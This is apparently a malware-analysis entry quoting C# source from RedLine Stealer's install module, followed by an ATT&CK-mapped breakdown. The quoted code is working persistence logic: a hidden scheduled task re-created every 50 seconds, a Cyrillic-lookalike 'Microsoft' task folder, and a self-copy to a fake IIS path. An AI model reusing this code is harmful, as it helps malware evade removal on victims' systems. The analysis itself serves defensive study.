# RedLine Stealer - Persistent Daily Scheduled Task

## Metadata
- **Repository**: MalwareSourceCode-main
- **File Path**: `Win32/Stealers/Win32.RedlineStealer.a/Win32.RedlineStealer.a/stub/RedLine.Logic.Others/InstallManager.cs`
- **Language**: C#
- **Malware Family**: RedLine Stealer

## Code Snippet

```csharp
public static void AddTaskScheduler()
{
    Thread thread = new Thread((ThreadStart)delegate
    {
        while (true)
        {
            try
            {
                // *** SCHEDULED TASK CREATION ***
                string arguments = "/create /tn \\Microsоft\\MicrosoftIIS_CheckInstalledUpdater" + 
                    Math.Abs((Environment.MachineName + Environment.UserName + Environment.OSVersion).GetHashCode()) + 
                    " /tr \"" + CurrentExeFile + "\" /st " + 
                    DateTime.Now.AddMinutes(1.0).ToString("HH:mm") + 
                    " /du 9999:59 /sc daily /ri 1 /f";
                    
                Process.Start(new ProcessStartInfo
                {
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    FileName = "schtasks.exe"
                }).WaitForExit();
            }
            catch (Exception value)
            {
                Console.WriteLine(value);
            }
            Thread.Sleep(50000);  // Re-create task every 50 seconds
        }
    });
    thread.IsBackground = true;
    thread.Start();
}

public static void Install()
{
    if (!IsRunningFromInstallPath)
    {
        if (!Directory.Exists(InstallDirectory))
        {
            Directory.CreateDirectory(InstallDirectory);
        }
        KillInstalled();
        File.Copy(CurrentExeFile, InstallPath, overwrite: true);
        Process process = Process.Start(new ProcessStartInfo
        {
            FileName = "MicrosoftIISAdministration_v2.exe",
            WorkingDirectory = InstallDirectory
        });
        while (process.Handle == IntPtr.Zero)
        {
            Thread.Sleep(100);
        }
        RemoveCurrent();
    }
    else
    {
        appMutex = new Mutex(initiallyOwned: true, 
            Math.Abs((Environment.MachineName + Environment.UserName + Environment.OSVersion).GetHashCode()).ToString(), 
            out var createdNew);
        IsSecondCopy = !createdNew;
        if (IsSecondCopy)
        {
            Environment.Exit(0);
        }
        AddTaskScheduler();  // Called from installation path
    }
}
```

## Analysis

**What it does:**
RedLine Stealer implements a highly persistent scheduled task mechanism that continuously re-creates the task every 50 seconds to ensure persistence even if the task is deleted by security tools or administrators.

**How it uses Windows Scheduled Tasks (T1053.005):**
- **Schedule**: `/sc daily` - configured as a daily task
- **Start time**: `/st HH:mm` - starts 1 minute after current time
- **Duration**: `/du 9999:59` - runs for essentially unlimited duration (9999 hours)
- **Repeat interval**: `/ri 1` - repeats every 1 minute within the duration window
- **Task path**: `\Microsоft\MicrosoftIIS_CheckInstalledUpdater[HASH]`
- **Force creation**: `/f` overwrites existing task

**Evasion/Stealth Techniques:**
1. **Typosquatting**: Task folder name "Microsоft" uses Cyrillic 'о' (U+043E) instead of Latin 'o', making it visually identical but technically different from legitimate "Microsoft" folder
2. **Legitimate-sounding name**: "MicrosoftIIS_CheckInstalledUpdater" mimics legitimate Windows/IIS update checking processes
3. **Dynamic naming**: Appends hash based on machine name, username, and OS version to avoid conflicts and detection
4. **Continuous re-creation**: Background thread recreates task every 50 seconds, making manual deletion ineffective
5. **Installation path masquerading**: Uses `%USERPROFILE%\Documents\IISExpress\Config\MicrosoftIISAdministration_v2.exe` - mimics legitimate IIS Express installation structure
6. **Hidden execution**: `CreateNoWindow = true` and `WindowStyle.Hidden`

**Notable Characteristics:**
- **High persistence**: The 50-second recreation loop makes this extremely difficult to remove without stopping the malware process
- **Aggressive scheduling**: Repeats every minute with nearly unlimited duration, ensuring near-constant execution
- **Mutex-based single instance**: Prevents multiple copies from running simultaneously

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary)
- **T1036.005**: Masquerading: Match Legitimate Name or Location
- **T1112**: Modify Registry (implied - task storage in TaskCache)
- **T1564.001**: Hide Artifacts: Hidden Files and Directories
